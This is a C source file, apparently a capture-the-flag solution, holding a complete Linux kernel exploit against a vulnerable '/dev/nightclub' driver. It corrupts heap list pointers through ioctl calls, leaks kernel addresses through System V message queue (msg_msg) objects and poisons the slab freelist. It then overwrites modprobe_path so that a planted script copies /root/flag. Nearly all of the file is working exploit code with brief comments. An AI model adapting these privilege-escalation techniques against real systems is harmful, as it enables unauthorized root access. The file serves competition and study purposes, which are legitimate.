#include <sys/types.h>
#include <sys/socket.h>

#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define ADD 0xCAFEB001
#define DEL 0xCAFEB002
#define EDIT 0xCAFEB003
#define LEAK 0xCAFEB004

int fd;

struct Request {
    unsigned long field0;
    unsigned long field1;
    char message[0x20];
    unsigned long msg_uid;    
    unsigned long offset;
    unsigned long msg_size;
};

typedef struct 
{
    long mtype;
    char mtext[0x10000];
} msg;

msg msgbuf;

int msg_open()
{
    int qid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    
    if (qid == -1)
    {
        perror("msgget");
        exit(-1);
    }

    return qid;
}

void msg_close(int qid) {
    msgctl(qid, IPC_RMID, 0);
}

void msgsend(int qid, void* msg, size_t size, int flag) {
    if (msgsnd(qid, msg, size, flag) == -1) {
        perror("msgsnd");
        exit(-1);
    }
}

void msgalloc(int qid, char *data, unsigned int size)
{
    msgbuf.mtype = 1;

    memcpy(msgbuf.mtext, &data[0x30], size - 0x30);

    msgsend(qid, &msgbuf, size-0x30, 0);
}

unsigned long add_chunk(unsigned long msg_size, unsigned long offset, unsigned long f0, unsigned long f1, char* msg) {
    struct Request req = {
        .field0 = f0,
        .field1 = f1,
        .offset = offset,
        .msg_size = msg_size        
    };

    memcpy(req.message, msg, 0x20);

    return ioctl(fd, ADD, &req);
}

unsigned long edit_chunk(unsigned long uid, unsigned long msg_size, unsigned long offset, char* msg) {
    struct Request req = {
        .msg_uid = uid,
        .msg_size = msg_size,
        .offset = offset
    };

    memcpy(req.message, msg, 0x20);

    return ioctl(fd, EDIT, &req);
}

unsigned long del_chunk(unsigned long uid) {
    struct Request req = {
        .msg_uid = uid
    };

    return ioctl(fd, DEL, &req);
}

unsigned long get_leak() {
    return ioctl(fd, LEAK, NULL);
}

int main()
{
    char buf[0x10000];
    unsigned long uid[40];
    
    // Prepare modprobe_path exploitation
    system("echo '#!/bin/sh\n/bin/cp /root/flag /home/user/flag\n/bin/chmod 777 /home/user/flag' > /home/user/copy.sh");
    system("chmod +x /home/user/copy.sh");
    system("echo '\xff\xff\xff\xff' > /home/user/dummy");
    system("chmod +x /home/user/dummy");
       
    int qid = msg_open();        
    fd = open("/dev/nightclub", O_RDWR);

    unsigned long leak = get_leak();

    for(int i=0; i<6; i++)
        uid[i] = add_chunk(0x20, 0x0, i, i, buf);
        
    del_chunk(uid[1]);
    del_chunk(uid[2]);
    
    // overwrite LSB of next pointer of follow chunk with 0x0 pointing to freed chunk
    edit_chunk(uid[3], 0x10, 0x10, buf);
    
    // allocate a msg_seq with 0x80, so it will be put into freed chunk uid[2]
    msgalloc(qid, buf, 0xfd0+0x80+0x20);
    
    // unlink chunk uid[4] to write prev pointer into msg_seq
    del_chunk(uid[4]);
    
    // receive the leak from msg_seq chunk
    msgrcv(qid, buf, 0xfd0+0x80+0x20-0x30, 1, 0);
    
    unsigned long kleak = *((unsigned long*)(buf+0xfd8));
    unsigned long msgbase = kleak-0x280;

    printf("Kernel leak   : %p\n", kleak);
    printf("Message base  : %p\n", msgbase);
    
    msg_close(qid);
    
    uid[2] = add_chunk(0x10, 0x0, 2, 2, buf);
    uid[4] = add_chunk(0x10, 0x0, 4, 4, buf);
    uid[1] = add_chunk(0x10, 0x0, 1, 1, buf);
        
    unsigned long* ptr = buf+0x10;

    (*ptr++) = msgbase + 0x180; // 0xffff888003fcf580;
    (*ptr++) = msgbase + 0x100; // 0xffff888003fcf500;

    edit_chunk(uid[4], 0x20, 0x10, buf);

    ptr = buf+0x10;

    (*ptr++) = msgbase;         //  0xffff888003fcf400;
    (*ptr++) = msgbase + 0x280; // 0xffff888003fcf680;

    edit_chunk(uid[2], 0x20, 0x10, buf);

    for(int i=0; i<6; i++)
        del_chunk(uid[i]);
    
    memset(buf, 0x42, 0x80);
    uid[0] = add_chunk(0x10, 0, 0, 0, buf); 
    uid[1] = add_chunk(0x10, 0, 1, 1, buf); 
    uid[2] = add_chunk(0x10, 0, 2, 2, buf); 
    uid[3] = add_chunk(0x10, 0, 3, 3, buf); 
    uid[4] = add_chunk(0x10, 0, 4, 4, buf); 
    uid[5] = add_chunk(0x10, 0, 5, 5, buf); 

    int qid2 = msg_open();

    // Allocate a msg_msg struct in the heap
    msgalloc(qid2, buf, 0x80);        
    
    // Add a chunk after the msg_msg, which contains pointer to master_list
    uid[6] = add_chunk(0x10, 0, 6, 6, buf);
    
    // Overwrite next pointer of chunk 0 with pointer to msg_msg->size
    ptr = buf+0x10;
    (*ptr++) = msgbase + 0x310 - 0x60;  // msg_msg->size - 0x60;
    (*ptr++) = msgbase + 0x180;         

    edit_chunk(uid[1], 0x20, 0x10, buf);
    
    // Overwrite size of msg_msg via corrupted next chunk
    ptr = buf;    
    (*ptr++) = 0x1000;
    (*ptr++) = 0x0;

    edit_chunk(0x4242424242424242, 0x10, 0x8, buf);

    // Receive msg_msg with corrupted size
    msgrcv(qid2, buf, 0x1000, 1, 0);

    unsigned long module_addr = *((unsigned long*)(buf+0x60));
    unsigned long module_base = module_addr - 0x2100;
    unsigned long kmalloc = module_base + 0x10 - leak;
    unsigned long kbase = kmalloc - 0x1caa50;
    unsigned long modprobe = kbase + 0x144fca0;

    printf("module addr   : %p\n", module_addr);
    printf("module base   : %p\n", module_base);
    printf("kmalloc       : %p\n", kmalloc);
    printf("kbase         : %p\n", kbase);
    printf("modprobe      : %p\n", modprobe);

    msg_close(qid2);
    int qid3 = msg_open();
    msgalloc(qid3, buf, 0x80);

    ptr = buf;    
    (*ptr++) = 0x1400;
    (*ptr++) = modprobe+0xec520;
    (*ptr++) = msgbase-0x10198;

    edit_chunk(0x4242424242424242, 0x18, 0x8, buf);
    
    msgrcv(qid3, buf, 0x1400, 1, 0);
    
    unsigned long target = *((unsigned long*)(buf+0xfe8));
    unsigned long cache_target = target + 0xee00;

    printf("Target        : %p\n", target);
    printf("Cache target  : %p\n", cache_target);
    
    // Overwrite a next ptr with a pointer into freelist
    ptr = buf+0x10;
    (*ptr++) = cache_target-0x70+4;
    (*ptr++) = msgbase; 

    edit_chunk(uid[5], 0x18, 0x10, buf);

    // Overwrite 0x80 freelist with modprobe - 0x30    
    ptr = buf+4;
    (*ptr++) = modprobe-0x30;
    (*ptr++) = 0x82;
    
    edit_chunk(0x0, 0x10, 0x8, buf);
    
    msg_close(qid3);

    // Allocate a msg_msg overwriting modprobe_path
    int qid4 = msg_open();

    strcpy(buf+0x30, "/home/user/copy.sh");
    
    msgalloc(qid4, buf, 0x80);
    close(fd);

    // Execute modprobe_path exploitation
    system("/home/user/dummy");
    system("cat /home/user/flag");
}
